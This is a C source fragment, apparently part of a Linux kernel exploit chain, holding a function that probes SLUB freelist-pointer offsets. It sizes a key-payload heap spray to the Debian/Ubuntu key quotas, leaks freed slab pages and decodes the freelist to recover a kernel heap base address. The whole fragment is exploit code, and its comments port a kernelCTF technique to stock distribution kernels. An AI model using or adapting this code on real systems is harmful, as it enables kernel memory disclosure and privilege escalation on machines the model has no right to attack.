/* Quota-aware wrapper around the SLUB freepointer probe.  Included by
   integrated_chain.inc, after race.inc. */

/*
 * Stock Debian/Ubuntu deny ~800 live keys (maxkeys=200, maxbytes=20000), so
 * the probe size has to follow the quotas instead of the 336 objects the
 * kernelCTF image allowed.  A partial retirement is still enough to move a
 * page, and the offset list is ordered by likelihood of appearing in a real
 * kernel (midpoint first, then the pre-hardening overlap at 0).
 */
static int k2_freeptr_probe(const char *fake_path, const char *page_path)
{
    static const unsigned int offsets[] = {
        128, 0, 64, 192, 96, 32, 160, 224, 16, 48, 80, 112, 144, 176, 208,
        240, 8, 24, 40, 56, 72, 88, 104, 120, 136, 152, 168, 184, 200, 216,
        232, 248,
    };
    unsigned long maxkeys = read_sysctl_ulong("/proc/sys/kernel/keys/maxkeys",
                                              200);
    unsigned long maxbytes = read_sysctl_ulong("/proc/sys/kernel/keys/maxbytes",
                                               20000);
    unsigned long payload = H_USER_PAYLOAD_REQUEST;
    unsigned long by_bytes = maxbytes / (payload * 2);
    unsigned long limit = maxkeys / 2 < by_bytes ? maxkeys / 2 : by_bytes;
    unsigned int count = H_USER_PAYLOAD_OBJECTS_PER_SLAB * 21U;
    unsigned char page[4096];
    uint64_t enc[H_USER_PAYLOAD_OBJECTS_PER_SLAB];
    struct freelist_solution solution;

    if (count > limit)
        count = (unsigned int)limit;
    if (count < 32)
        count = 32;
    printf("K2_FREEPTR_PROBE budget objects=%u maxkeys=%lu maxbytes=%lu\n",
           count, maxkeys, maxbytes);
    for (size_t i = 0; i < ARRAY_SIZE(offsets); i++) {
        k2l.freeptr = offsets[i];
        if (retire_and_leak_payloads(count, 6, K2_LEAK_DELAY_US, fake_path,
                                     page_path) != 0)
            continue;
        if (read_page_file(page_path, page) != 0)
            continue;
        extract_freelist_words(page, enc);
        if (solve_freelist(enc, &solution) == 0) {
            printf("K2_FREEPTR_PROBE offset=%u base=%#" PRIx64 "\n",
                   k2l.freeptr, solution.base);
            return 0;
        }
        /* All-zero words look like a terminal-only chain; drop the guess. */
    }
    return -ENOENT;
}
